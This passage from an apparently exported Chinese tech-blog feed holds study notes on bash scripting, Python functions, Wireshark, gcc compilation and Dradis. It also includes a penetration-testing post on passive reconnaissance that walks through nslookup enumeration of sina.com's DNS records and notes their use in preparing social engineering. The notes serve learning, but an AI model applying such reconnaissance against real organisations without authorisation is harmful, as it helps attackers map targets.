until循环与while相反，当条件成立时就终止循环，否则就进入循环！ until [ 条件 ]do 程序段done12实例: #!/bin/bash PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATHwhile [ “$yn” != “yes” ]do read -p “please input yes to stop this program:” yndoneecho “ok ,you input the correct answer.”123456---#### for ...do...done__语法:__ for var in con1 con2 con3do程序段done12实例: for animal in dog pig catdo echo “${animal}”done运行结果:dogpigcat1for循环对数值运算的处理 #!/bin/bash PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binexport PATHread -p “input a number,i will count for total your input:” nu s=0for((i=1;i&lt;=$nu;i=i+1))do s=$(($s+$i))doneecho “the result of ‘1+2+3+4+…+$nu is ==&gt; $s”123---### 0xA Shell Script的追踪与debug root@jack:~# sh [-nvx] script.sh选项与参数:-n:不要运行 script，仅查询语法的问题；-v:再运行 sccript 前，先将 scripts 的内容输出到萤幕上；-x:将使用到的 script 内容显示到萤幕上，这是很有用的参数！```]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python(6)-函数]]></title>
      <url>%2F2016%2F04%2F12%2FPython(6)-%E5%87%BD%E6%95%B0%2F</url>
      <content type="text"><![CDATA[0x00 函数定义和声明Python中使用关键字def来定义(define)函数，同时也可以在定义函数时进行参数的初始化:12345def function(a = 1, b = 3 ,c = 4): print a,b,cfunction()运行结果:1,3,4 0x01 函数参数传递 值传递(也叫位置传递)__ 12345def function(a=1, b=3, c=4): print a,b,cfunction(4,5,6)运行结果:4,5,6 对于基本类型的变量，变量传递给函数后，函数或在内存中复制一个新的变量，从而不影响原来变量的值。我们称此为值传递 指针传递 12345678b = [1,2,3]def chang_list(b): b[0] = b[0]+1 return bprint chang_list(b)print b运行结果:2,2,3 对于表来说，表传递给函数的是一个指针，指针指向序列在内存中的位置，在函数中对表的操作将在原有内存中进行，从而影响原有变量。我们称此为指针传递。 关键字传递(keyword) 12345def function(a=1, b=3, c=4): print a, b, cfunction(b=10, a=100, c=99)运行结果:100,10,99 关键字(keyword)传递是根据每个参数的名字传递参数。关键字并不用遵守位置的对应关系 包裹传递(packing) 123456789def f(*name): print type(name) print namef(1, 2, 3)f(4,5,6,7)运行结果:&lt;type &apos;tuple&apos;&gt;(1, 2, 3)(4,5,6,7) 有时我们在定义函数式时并不知道调用的时候回传递多少个参数，这时，包裹(packing)位置传递，或者包裹关键字就很好了. 如上我们进行了两次函数调用，在f函数的参数列表里，所有的参数均呗name收集，根据位置合成一个元组(tuple),这就是包裹传递！ 0x02 函数和文件12345678910111213141516171819202122232425262728from sys import argv#从sys库中导入argv模块script,input_file=argv#参数传递def print_all(f): print f.read()#读取所有文件内容并打印到屏幕def rewind(f): f.seek(0)#将文件指针重新定位到开头，这样做的好处是不用再重新打开文件def print_a_line(line_count,f): print line_count,f.readline()#打印输出第一行current_file=open(input_file)print_all(current_file)rewind(current_file)current_line=1print_a_line(current_line,current_file)current_line=2print_a_line(current_line,current_file)current_line=3print_a_line(current_line,current_file) 0x04 函数的返回值123456789101112131415def secret_formula(started): jelly_beans=started*500 jars=jelly_beans/1000 crates=jars/100 return jelly_beans,jars,cratesstart_point=100000beans,jars,crates=secret_formula(start_point)print &quot;with a starting point of:%d&quot; % start_pointprint &quot;we&apos;d have %d beans,%d jars,and %d crates.&quot; % (beans,jars,crates)start_point=start_point/10print &quot;we can also do that this way:&quot;print &quot;we&apos;d have %d beans,%d jars,and %d crates.&quot; % secret_formula(start_point)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WIRESHARK初识]]></title>
      <url>%2F2016%2F04%2F11%2Fkali%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-WIRESHARK%2F</url>
      <content type="text"><![CDATA[0x00 WIRESHARK简介wireshark前称Ethereal，是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换(—百度百科)作为一款强大的抓包嗅探和协议分析工具，熟练的掌握它是安全专家必备技能！ wireshark本身只是对网络流量进行分析而不会去抓包，wireshark下的抓包组件引擎主要有两个: linux-Libpcap9 windows-Winpcap10 衡量一个网络分析工具的强大与否最重要的一个参数指标就是它的解码能力，而wireshark在主流的分析软件中的解码能力是首屈一指的！ 0x01 WIRESHARK的基本使用方法wireshark是kali的十大安全工具之一，所以在kali2.0下我们很容易的就能找到她了！ 指定抓包网卡 在start的下拉框下指定抓取哪个网卡的进入流量，同样也可以选择interface list指定使用哪块网卡！ interface list下的options： 可以看到默认打钩的那一项Use promiscuous mode on all interfaces:抓取哪些经过我的网卡的但是并不是发送给我的数据包，不勾选则是不会抓取除了我本地网卡绑定的IP之外的数据包的！但如果你想了解下你所在的网络里的所有的机器传输数据的情况则必须选择混杂模式！ Cpature Filter(抓包筛选器):为了减少混杂模式下所抓取的大量数据包对分析所产生的影响，我们可以过滤掉那些我并不想要抓取的数据包！点击Capture Filter选则格式抓取指定类型的数据包！ 0x02 对抓取的数据进行保存菜单栏&gt;File&gt;Save!只要是对数据保存的格式的选择，建议选择兼容性最好的Wireshark/tcpdumo/-pcap格式！最后好可以选择gzip对数据包进行压缩！以后便可以将其提取出来进行分析了！ 0x03 WIRESHRK界面初识Edit-&gt;Preferences(首选项):界面布局，对wireshark进行主题，颜色，字体等选择！ 0x04 WIRESHARK筛选器 抓包筛选器(Display Filters) 显示筛选器(Capture Filters) 0x05 常见协议包 Arp: lcmp: TCP: UDP: DNS: HTTP: FTP:]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[被动信息收集]]></title>
      <url>%2F2016%2F04%2F11%2F%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
      <content type="text"><![CDATA[0x00 被动信息收集被动信息收集指的是通过公开渠道可获得的信息，与目标系统不产生直接交互，尽量避免留下一切痕迹。 OSINT：关于开源智能信息收集可以参看一下两篇文章：美国军方：http://www.fas.org/irp/dodair/army/atp2-22-2.pdf被大西洋公约组织：http://information-retireval.info/docs/NATO-OSINT.html 信息收集的过程Passive reconnaissance(no direct interaction)-&gt;Normal interaction-&gt;Active reconnaissance-&gt;More information greater chance of detection 信息收集的内容ip地址段，域名信息，邮件地址(判断是个人搭建的邮件信息服务器还是使用的企业级邮件服务器)，文档图片数据，公司地址，公司组织架构，联系电话/传真号码，人员姓名/职务，目标系统使用的技术架构，公开的商业信息 信息用途用信息描述目标，发现目标的物理系统，为社会工程学攻击奠定基础，以及发现一些可能的物理缺口 0x01 信息收集之-DNS DNS域名，FQDN与IP地址，PTP，NS，A，Cname，MX对于一个网站最想了解的或许就是域名，比如sinlang.com这是一个域名(Domain Name)，www.sinlang.com则是完全限定域名(FQND:Fully Qualified Domain Name),FQND即是是该域名(sinlang.com)下的一个主机记录，主机记录也叫做A记录，当然也有可能是一个别名记录(C name)。每个域名都一个或者多个域名服务器，用来负责对该域名的解析，而域名服务器地址又是通过DNS里面的NS记录进行定义和注册的。此外每个域名或者也有自己的邮件服务器(MX记录)。而前面所有的解析记录都是将主机名解析成另外一个主机名或者IP地址，但是ptr则是一个反向解析记录的过程，即是将IP地址解析成主机名。 DNS 查询以各种不同的方式进行解析。有时，客户端也可使用从先前的查询获得的缓存信息就地应答查询。DNS 服务器可使用其自身的资源记录信息缓存来应答查询。DNS 服务器也可代表请求客户端查询或联系其他 DNS 服务器，以便完全解析该名称，并随后将应答返回至客户端。这个过程称为递归。另外，客户端自己也可尝试联系其他的 DNS 服务器来解析名称。当客户端这么做的时候，它会根据来自服务器的参考答案，使用其他的独立查询。该过程称作迭代。 0x02 DNS信息收集工具-NSLOOKUP1234root@jack:~# nslookup&gt; www.sina.comServer: 112.100.100.100 &#123;本地缓存DNS服务器,就是所在地的运营商的服务器，如果不想使用本地服务商解析，可以更换任意的DNS服务器进行解析，比如:server 8.8.8.8更换为谷歌的DNS服务器进行解析！&#125;Address: 112.100.100.100#53 解析结果:123456789101112131415161718Non-authoritative answer:www.sina.com canonical name = us.sina.com.cn.us.sina.com.cn canonical name = news.sina.com.cn.news.sina.com.cn canonical name = jupiter.sina.com.cn.jupiter.sina.com.cn canonical name = hydra.sina.com.cn.Name: hydra.sina.com.cnAddress: 218.30.108.188Name: hydra.sina.com.cnAddress: 218.30.108.182Name: hydra.sina.com.cnAddress: 218.30.108.190Name: hydra.sina.com.cnAddress: 218.30.108.183Name: hydra.sina.com.cnAddress: 218.30.108.181Name: hydra.sina.com.cnAddress: 218.30.108.191Name: hydra.sina.com.cn 可以看到www.sina.com并没有被直接解析为一个特定的IP地址，所以www.sina.com不是一个A记录，而是一个C name记录，转而被继续解析成us.sina.com.cn，一直解析知道主机记录。 查找新浪FTP服务器的IP首先查MX记录1234567891011root@jack:~# nslookup&gt; set type=mx &gt; sina.com查询结果: Server: 112.100.100.100Address: 112.100.100.100#53Non-authoritative answer:sina.com mail exchanger = 5 freemx1.sinamail.sina.com.cn.sina.com mail exchanger = 10 freemx2.sinamail.sina.com.cn.sina.com mail exchanger = 10 freemx3.sinamail.sina.com.cn. 再查询三A个记录的IP1234567891011121314151617181920212223Authoritative answers can be found from:&gt; set type=a&gt; freemx1.sinamail.sina.com.cn.Server: 112.100.100.100Address: 112.100.100.100#53Non-authoritative answer:Name: freemx1.sinamail.sina.com.cnAddress: 202.108.3.242&gt; freemx2.sinamail.sina.com.cn.Server: 112.100.100.100Address: 112.100.100.100#53Non-authoritative answer:Name: freemx2.sinamail.sina.com.cnAddress: 218.30.115.106&gt; freemx3.sinamail.sina.com.cn.Server: 112.100.100.100Address: 112.100.100.100#53Non-authoritative answer:Name: freemx3.sinamail.sina.com.cnAddress: 60.28.2.248 查询新浪的所有域名服务器123root@jack:~# nslookup&gt; set type=ns&gt; sina.com 返回结果:12345678910Non-authoritative answer:sina.com nameserver = ns3.sina.com.sina.com nameserver = ns2.sina.com.cn.sina.com nameserver = ns2.sina.com._sina.com nameserver = ns1.sina.com._sina.com nameserver = ns1.sina.com.cn.sina.com nameserver = ns3.sina.com.cn.sina.com nameserver = ns4.sina.com.cn.sina.com nameserver = ns4.sina.com.Authoritative answers can be found from: 解析解析sina.com nameserver = ns1.sina.com.对应的ip地址:12&gt; set type=a&gt; ns1.sina.com 返回结果:123456Server: 112.100.100.100Address: 112.100.100.100#53Non-authoritative answer:Name: ns1.sina.comAddress: 114.134.80.144 以此类推我们可以将sina的所有ip地址全部解析出来! 参数set type=anyany可以解析所有的服务器记录。12&gt; set type=any&gt; sina.com 返回结果：123456789101112131415161718192021Address: 66.102.251.33sina.com text = &quot;v=spf1 include:spf.sinamail.sina.com.cn -all&quot;sina.com origin = ns1.sina.com.cn mail addr = zhihao.staff.sina.com.cn serial = 2005042601 refresh = 900 retry = 300 expire = 604800 minimum = 300sina.com nameserver = ns2.sina.com.sina.com nameserver = ns3.sina.com.sina.com nameserver = ns1.sina.com.cn.sina.com nameserver = ns2.sina.com.cn.sina.com nameserver = ns1.sina.com.sina.com nameserver = ns4.sina.com.cn.sina.com nameserver = ns4.sina.com.sina.com nameserver = ns3.sina.com.cn.sina.com mail exchanger = 10 freemx2.sinamail.sina.com.cn.sina.com mail exchanger = 10 freemx3.sinamail.sina.com.cn.sina.com mail exchanger = 5 freemx1.sinamail.sina.com.cn. 我们可以看到any查询出了sina.com域名的所有记录，ns记录，mail邮件交换记录。除此以为我们可以看到有一条特殊的记录即”text”,SPF记录，其作用就是反垃圾邮件的，根据方向解析，获得垃圾邮件的来源地址，对服务器得到ip进行对比，若匹配则判断为正规邮件，不匹配则为垃圾邮件！ 当然以上的命令可以合成一条：nslookup -q=any 163.com 0x03 PTR反向解析记录]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[文档记录工具]]></title>
      <url>%2F2016%2F04%2F11%2F%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7%2F</url>
      <content type="text"><![CDATA[在渗透测试中不一定都是单兵作战，因为所涉及的领域和方向很多，所以这个时候过程文档记录就很有用了！ 0x00 DradisDradis是一个开放源代码的框架，用于在安全评估过程中实时共享信息。dradis自身包含了一个web应用程序，它提供了一个集中的资料库来记录什么迄今已完成的工作和仍然需要做的工作。它的特点包括： 易于生成报告。 支持附件。 通过服务器的插件，集成现有的系统和工具。 平台无关。 Dradis远远不只是一个单纯的记笔记的应用程序。它支持SSL通信，可以导入的Nmap和Nessus结果文件，附加文件，生成报表，并且可以扩展，通过扩展就可以与（如漏洞数据库）外部系统结合。无论作为个人的信息积累和团队协作Dradis都是一个非常不错的工具。 使用卡里打开Dradis:应用程序-&gt;报告工具集-&gt;Dradis KeepnoteTruecrypt]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[WIRESHARK信息统计]]></title>
      <url>%2F2016%2F04%2F11%2FWIRESHARK-Statistics%EF%BC%88%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1%EF%BC%89%2F</url>
      <content type="text"><![CDATA[0x00 Endpoints:节点信息，包括tcp,udp的节点个数等！ ProtocolHierarchy:了解当前所抓的数据都有哪些协议类型的包所占的百分比是多少。 Conversation:判断哪个ip所占的宽带比例最多，是否被僵尸病毒入侵！ 值得注意的是wireshark默认只是通过端口来对协议包进行判断的，即是80端口下它就会是tcp的协议包了，这显然是不准确的 解码方式Analyse—&gt;Decode As:用来精确的分析数据包所属的协议类型！ 专家信息:Analyse-&gt;Expert Info:通过对专家系统给出的信息对网络中可能存在的问题进行判断，结论的正确与否完全取决于专家系统分析的结果是否准确！ 0x01 WIRESHARK-实践抓包对比nc，ncat加密与不加密流量对比：虚拟机A: kali(192.168.137.13)；虚拟机B: ubuntu(192.168.137.12) {为方便操作，请同时将两个虚拟机的网卡改为hostonly模式【根据之前的设置Vmnet0就是honstonly模式的啦！】} WIRESHARK的不足之处就是不适合大数据大流量的抓包分析处理！ 0x02 其他更强大的抓包软件 sniffer Cace/riverbed]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第二十一章-软件安装]]></title>
      <url>%2F2016%2F04%2F10%2F%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%89%E8%A3%85%2F</url>
      <content type="text"><![CDATA[0x00 软件的安装升级 关于源代码，编译器与与可执行文件Linux系统上真正认可的可执行文件其实只有二进制文件(binary program)。shell scripts只是利用了shell这一程序的功能进行一些判断，其实任是呼叫一些已经编译好的二进制程序来执行。可以使用file命令来判断是否为二进制文件。 关于编译与链接与gcc可以看另一篇文章:http://www.jianshu.com/p/96fa579665e9 关于函数库函数库分为动态和静态函数库，Linux的核心提供很多的核心相关函数库与外部参数，这些核心相关参数大多放在/usr/include，/usr/lib，/usr/lib64下。 关于make与configuremake的主要作用是简化编译过程的指令。我们知道使用gcc进行单一程序编译时，但是无所谓，很简单，但若是一个大点的项目呢？gcc就吃不消了。 当使用make命令时，make会在当前目录下搜索Makefile这个文件，里面记录了源代码如何编译的详细信息。并且会自动判断源代码是否改动过了，而自动更新可执行文件。 其实每个软件都会有一个运行环境侦查程序，用来检测系统已经具备该安装该软件所需的环境或者相关依赖，即使通常所说的configure或者是config。然后我们运行config来呼叫make对源代码进行编译，生成可执行文件。 也正因为如此，不同OS的核心，或者函数库的位置的不同，一旦编译过的软件是很难在其它的OS上运行，所以才需要重复编译源代码。 关于TarballTarball就是将软件的源代码先以tar打包，然后再压缩的包了。 0x01 关于程序的编译假如有两个程序，主程序是:thanks123456#include&lt;stdio.h&gt;int main(void)&#123; printf(&quot;hello world!\n&quot;); thanks_2();&#125; 副程序是：thanks_2()12345#include&lt;stdio.h&gt;void thanks_s(void)&#123; printf(&quot;thanks you!!&quot;);&#125; 将两个程序进行编译后链接12345678910➜ c_programer gcc -c thanks.c thanks_2.c ➜ c_programer ll thanks* -rw-r--r-- 1 root root 1496 5月 29 09:23 thanks_2.o-rw-r--r-- 1 root root 1560 5月 29 09:23 thanks.o➜ c_programer gcc -o thanks thanks.o thanks_2.o➜ c_programer ls thanks*thanks thanks_2.c thanks_2.o thanks.c thanks.o➜ c_programer file thanksthanks: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped 编译完成得到.o文件，然后进行链接最后得到可执行文件thanks。 由此我们可以知道目标文件.o的意义，因为有时候源代码文件不知一个，我们无法直接进行编译，这时便要先生成目标文件，然后在链接成为可执行文件。此外，当某个源文件更新后也不需要从新编译整个项目，而是只需要编译该个源文件，然后再链接就行。0x02 make编译pass 0x03 Tarball的管理 0x04 函数库管理 0x05 软件检验]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第十一章-BASH]]></title>
      <url>%2F2016%2F04%2F10%2F%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0BASH%2F</url>
      <content type="text"><![CDATA[0x00 关于BASH管理整个计算机硬件的其实是操作系统的核心 (kernel)，这个核心是需要被保护的！ 所以我们一般使用者就只能透过 shell 来跟核心沟通，以让核心达到我们所想要达到的工作。 Shell其实就是能够操作应用程序的接口的壳程序！ 但是shell的版本是很多的，比如Bourne SHell(sh),C SHell,商业上常用的K SHell，以及Bourn Again SHell(bash)这个是Bourne SHell的增强版！ 而bash 是 GNU 计划中重要的工具软件之一，目前也是 Linux distributions 的标准 shell 。 bash 主要兼容于 sh ，并且依据一些使用者需求，而加强的 shell 版本。不论你使用的是那个 distribution ，你都难逃需要学习 bash 的宿命啦！ 查看/etc/shells文件看看我们的电脑可以使用哪些shell:12345678root@jack:~# cat /etc/shells # /etc/shells: valid login shells/bin/sh/bin/dash/bin/bash/bin/rbash/usr/bin/screen/usr/bin/tmux Bash shell的功能:命令记忆功能:bash最棒的一个功能就是能记住你过去使用过的命令，默认可以记住1000条，它会将所有记住的命令存放在你的加目录.bash_history中。1root@jack:~# cat .bash_history 但需要知道的是，~/.bash_history 记录的是前一次登陆以前所运行过的命令，而至于这一次登陆所运行的命令都被缓存在内存中，当你成功的注销系统后，该命令记忆才会记录到 .bash_history 当中！ 命令别名配置功能:(alias)我们可以个一些常用的同时又很复杂的命令设置别名，比如:1root@jack:~# alias lm=&apos;ls -al&apos; 通配符:bash还支持许多的通配符来帮助用户查询与命令下达:例如:{ $ ls -l /usr/bin/X* }查询/usr/bin下以X开头的文件. 小插曲:命令的下达 使用(反斜杠)来跳脱:当我们下达的命令太长需要两行时:12root@jack:~# cp /var/spool/mail/root/etc/crontab\&gt; /etc/bin /root 将三个文件复制到/root下。 0x01 shell的变量功能 变量的取用与配置首先我们来取出变量的内容出来看看，这样我们便要用到echo命令了，当然echo的可不止这一个哈，后面我们会慢慢道来，变量在被取用时，前面必须要加上美元符号”$”,或者用”${PATH}”来读取！123root@jack:~# echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binroot@jack:~# echo $&#123;PATH&#125; 在shell中配置一个变量1234root@jack:~# echo $mynameroot@jack:~# myname=jackroot@jack:~# echo $mynamejack 若你有一个常去的工作目录名称为：『/cluster/server/work/taiwan_2005/003/』，如何进行该目录的简化12root@jack:~# work=&quot;/cluster/server/work/taiwan_2005/003/&quot;root@jack:~# cd $work 变量的配置规则: 变量内容若有空格符号可以使用双引号(“)或单引号(‘)将变量内容结合起来，但: 双引号内的特殊字符如 $ 等，可以保有原本的特性，如下所示：『var=”lang is $LANG”』则『echo $var』可得『lang is en_US』 单引号内的特殊字符则仅为一般字符 (纯文本)，如下所示：『var=’lang is $LANG’』则『echo $var』可得『lang is $LANG』 可用跳脱字符『 \ 』将特殊符号(如 [Enter], $, \, 空格符, ‘等)变成一般字符； 在一串命令中，还需要藉由其他的命令提供的信息，可以使用反单引号『`命令`』或『$(命令)』。特别注意，那个 ` 是键盘上方的数字键 1 左边那个按键，而不是单引号！例如想要取得核心版本的配置： 12345root@jack:~# uname -r4.0.0-kali1-amd64root@jack:~# versoin=$(uname -r)root@jack:~# echo $versoin 4.0.0-kali1-amd64 已知locate命令可以列出所有的相关文件来，但是如果我想知道所有文件的权限呢?1root@jack:~# ls -l `locate sina` 若该变量为扩增变量内容时，则可用 “$变量名称” 或 ${变量} 累加内容，如下所示： 123root@jack:~# version=$&#123;version&#125;yesroot@jack:~# echo $version4.0.0-kali1-amd64yes 若该变量需要在其他子程序运行，则需要以 export 来使变量变成环境变量：『export PATH』 取消变量的方法为使用 unset 『unset变量名称』例如取消 myname 的配置:unset myname 0x02 环境变量的功能我们可以使用env和export两个命令来查看目前我的shell环境中有多少默认的环境变量! env观察环境变量与常用环境变量:12345678910111213root@jack:~# envXDG_VTNR=7GPG_AGENT_INFO=/run/user/0/keyring/gpg:0:1SHELL=/bin/bash &#123; 代表目前使用的shell&#125;TERM=xtermLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;.........(省略)USERNAME=rootPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin &#123; 这个就是运行文件搜索的路径啦，目录与目录之间用冒号隔开&#125;DESKTOP_SESSION=defaultQT_IM_MODULE=fcitxPWD=/rootHOME=/root &#123; 代表用户的家目录，很多程序都可能会取用到这个变量的值!&#125; env是(enviroment)的缩写，上面的意思是列出所有的环境变量来，当然export其中的一个功能也是可以这样的！ set观察所有变量(包括环境变量与自定义变量)set 除了环境变量之外， 还会将其他在 bash 内的变量通通显示出来，下面仅列出几个重要的内容： 12345678910111213root@jack:~# setGTK_IM_MODULE=fcitxHISTCONTROL=ignorebothHISTFILE=/root/.bash_historyHISTFILESIZE=2000HISTSIZE=1000HOME=/rootHOSTNAME=jackHOSTTYPE=x86_64IFS=$&apos; \t\n&apos;LANG=zh_CN.UTF-8LINES=24LOGNAME=root 基本上，在 Linux默认的情况中，使用{大写的字母}来配置的变量一般为系统内定需要的变量，比较重要的有以下几个: PS1:提示字符的配置这是 PS1 (数字的 1 不是英文字母)，这个东西就是我们的『命令提示字符』喔！当我们每次按下 [Enter] 按键去运行某个命令后，最后要再次出现提示字符时， 就会主动去读取这个变量值了 * \d ：可显示出『星期 月 日』的日期格式，如：&quot;Mon Feb 2&quot; * \H ：完整的主机名。举例来说，鸟哥的练习机为『www.vbird.tsai』 * \h ：仅取主机名在第一个小数点之前的名字，如鸟哥主机则为『www』后面省略 * \t ：显示时间，为 24 小时格式的『HH:MM:SS』 * \T ：显示时间，为 12 小时格式的『HH:MM:SS』 * \A ：显示时间，为 24 小时格式的『HH:MM』 * \@ ：显示时间，为 12 小时格式的『am/pm』样式 * \u ：目前使用者的账号名称，如『root』； * \v ：BASH 的版本信息，如鸟哥的测试主板本为 3.2.25(1)，仅取『3.2』显示 * \w ：完整的工作目录名称，由根目录写起的目录名称。但家目录会以 ~ 取代； * \W ：利用 basename 函数取得工作目录名称，所以仅会列出最后一个目录名。 * \# ：下达的第几个命令。 * \$ ：提示字符，如果是 root 时，提示字符为 # ，否则就是 $ 啰～ 配置我的字符提示变量:12root@jack:~# PS1=&apos;[\u@\h \w \A #\#]\$ &apos;[root@jack ~ 15:27 #2]# ls export 自定义变量转换成环境变量其实所谓的环境变量(也可以理解为全局变量)与自定义变量(也可以理解为局部变量)的区别便是，该变量是否会被子程序所继续引用。当我们登录Linux并取得一个bash后，我们得到的bash就是一个独立的程序，接下来在这个bash底下所下达的任何命令都是由这个bash衍生出来的，那些被下达的命令就被成为子程序了，在shell中，子程序仅会继承父程序的环境变量，而不会继承父程序的自定义变量,所以这时export命令就很有用了！export主要用在分享自己的变量配置给后来呼叫的文件或其他程序。1[root@jack ~ 15:46 #4]# export 变量名 这里关于如何就爱那个环境变量转换成自定义变量将在后续的declare里介绍！ 0x03 变量键盘读取，数组，声明:read,array,declare read 用来读取来自键盘的输入的变量，用法如下:123选与参数:&#123; USE $: read [-pt] variable &#125;-p:后面可以接提示字符-t:后面接等待的&quot;秒数&quot; 从键盘输入一内容，并将该内容赋值给test变量1234root@jack:~# read testthis is test &quot;&#123;此时光标会等待你输入，此处我输入的是&quot;this is test&quot;&#125;&quot;root@jack:~# echo $testthis is test 提示用户在30秒内输入自己的名字，并将该内容赋值给变量named1234root@jack:~# read -p &quot;please input your name:&quot; -t 30 namedplease input your name:jack &quot;&#123; 看，此时会有提示字符哟！&#125;&quot;root@jack:~# echo $namedjack declare/typesetdeclare或typeset是一样的功能，就是声明变量的类型12345选项与参数:&#123;USE $: declare [-aixr] variable &#125;-a:将变量定义为数组类型(array)-i:将变量定义为整数类型(integer)-x:用法与export一样，就是将变量变成环境变量-r:将变量配置为readonly类型，该变量不可被更改，也不能unset 需要知道的是，在默认情况下，bash对于变量有几个基本的定义: 变量类型默认为字符串，所以若是不指定变量类型，则1+2为一个字符而不是数学表达式 bash环境中的数值运算，默认只能达到整数形态，所以1/3结果是0 让变量sum进行100+300+50的计算123root@jack:~# declare -i sum=100+300+50root@jack:~# echo $sum450 将sum变成环境变量123root@jack:~# declare -x sumroot@jack:~# export | grep sumdeclare -ix sum=&quot;450&quot; 让sum变成只读属性，不可更改123root@jack:~# declare -r sumroot@jack:~# sum=dkfdbash: sum: 只读变量 让sum变回去，变成自定义变量123root@jack:~# declare +x sum &quot;&#123; 将-变成+就可以进行取消了 &#125;&quot;root@jack:~# declare +p sum &quot;&#123; -p可以单独列出变量类型 &#125;&quot;declare -ir sum=&quot;450&quot; &quot;&#123; 看，现在只剩下i，r属性了，不在具备x了 &#125;&quot; declare结合数组的在一起是很有用的，但有趣的是，一旦将变量的配置为只读通常得要注销再重新登陆才能该变量的类型！ 数组(array)变量类型在bash里数组的声明方式是:var[number]=content12345root@jack:~# var[1]=&quot;small min&quot;root@jack:~# var[2]=&quot;big min&quot;root@jack:~# var[3]=&quot;nice min&quot;root@jack:~# echo &quot;$&#123;var[1]&#125;,$&#123;var[2]&#125;,$&#123;var[3]&#125;&quot;small min,big min,nice min 对于数组的读取，一般建议使用${数组}的方式来读取 0x04 文件系统与程序的限制关系:ulimit通过ulimit命令，bash可以限制某些用户的某些系统资源，包括可以开启的文件数量，可以使用的cpu时间，可以使用的内存总量等 ulimit 1234选项与参数:&#123; use $: ulimit [-SHacdfltu] 配额 &#125;-a ：后面不接任何选项与参数，可列出所有的限制额度；-f ：此 shell 可以创建的最大文件容量(一般可能配置为 2GB)单位为 Kbytes-u ：单一用户可以使用的最大程序(process)数量。 0x05 变量的删除取代与替换 变量内容的删除 变量配置方式 说明 ${变量#关键字} 若变量内容从头开始的数据符合[关键字]，则将符合的最短数据删除 ${变量##关键字} 若变量内容从头开始的数据符合[关键字]，则将符合的最长数据删除 ${变量%关键字} 若变量内容从尾向前的数据符合[关键字]，则将符合的最短数据删除 ${变量%%关键字} 若变量内容从尾向前的数据符合[关键字]，则将符合的最长数据删除 ${变量/旧字符串/新字符串} 若变量内容符合[旧字符串]，则[第一个字符串将会被新字符串所取代] ${变量//旧字符串//新字符串} 若变量内容符合[旧字符串]，则[全部字符串将会被新字符串所取代] 实例:根据需要删除path路径123456789root@jack:~# path=$&#123;PATH&#125;#先让小写path获得PATH变量内容root@jack:~# echo pathpathroot@jack:~# echo $path/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin#删除前四个目录root@jack:~# echo $&#123;path#/*usr/bin:&#125;/sbin:/bin 删除前面的所有目录，只保留最后一个目录12root@jack:~# echo $&#123;path##/*:&#125;/bin 变量的测试与内容替换有时候我们需要判断某个变量是否存在，Bash Shell可以进行变量的条件替换,既只有某种条件发生时才进行替换： (1) ${value:-word} 当变量未定义或者值为空时,返回值为word的内容,否则返回变量的值. (2) ${value:=word}与前者类似,只是若变量未定义或者值为空时,在返回word的值的同时将word赋值给value (3) ${value:?message}若变量以赋值的话,正常替换.否则将消息message送到标准错误输出(若此替换出现在Shell程序中,那么该程序将终止运行) (4) ${value:+word}若变量以赋值的话,其值才用word替换,否则不进行任何替换 (5) ${value:offset} ${value:offset:length}从变量中提取子串,这里offset和length可以是算术表达式.以上变量测试也是可以通过shell script内的if…then…来处理的，既然bash有提供这么简单的方法我们也可以吸收一下下！ 0x06 命令别名与历史命令 命令别名配置:alias,unalias使用alias我们可以为一个很长的命令配置一简短的命令别名来取代既有的命令！ 使用方法:{ use $: alis 别名=’命令 选项…’ } 例如:123root@jack:~# alias vi=&apos;vim&apos;root@jack:~# alias lm=&apos;ls -al | more&apos;root@jack:~# alias rm=&apos;rm -i&apos; 然后使用alias查看目前有哪些命令别名12345root@jack:~# aliasalias lm=&apos;ls -al | more&apos;alias ls=&apos;ls --color=auto&apos;alias rm=&apos;rm -i&apos;alias vi=&apos;vim&apos; 至于如果想要缺消别名的话，就使用unalias:1root@jack:~# unalias lm 但是我们添加的alias会在没开机以后就没有了，如果想要永久生效，那么需要在.bashrc文件最后添加alias命令1234root@jack:~# vim .bashrcalias ffx=&apos;firefox &gt; /tmp/firefox.txt 2&gt;&amp;1 &amp;&apos;alias fuck-gwf=&apos;bash /software/shadowsocks-gui-0.6.4-linux-x64/start.sh &gt; /tmp/gwf.txt 2&gt;&amp;1 &amp;&apos; 或者新建立一个文件名为.bash_aliases的文件用来专门存放我们的alias命令123root@jack:~# vim .bash_aliasesalias ffx=&apos;firefox &gt; /tmp/firefox.txt 2&gt;&amp;1 &amp;&apos;alias fuck-gwf=&apos;bash /software/shadowsocks-gui-0.6.4-linux-x64/start.sh &gt; /tmp/gwf.txt 2&gt;&amp;1 &amp;&apos; 然后，更新下:source .bashrc文件！{ 对了上面两个命令，懂的自然懂，哈哈！！} 历史命令 history123456选项与参数:&#123; use $: history 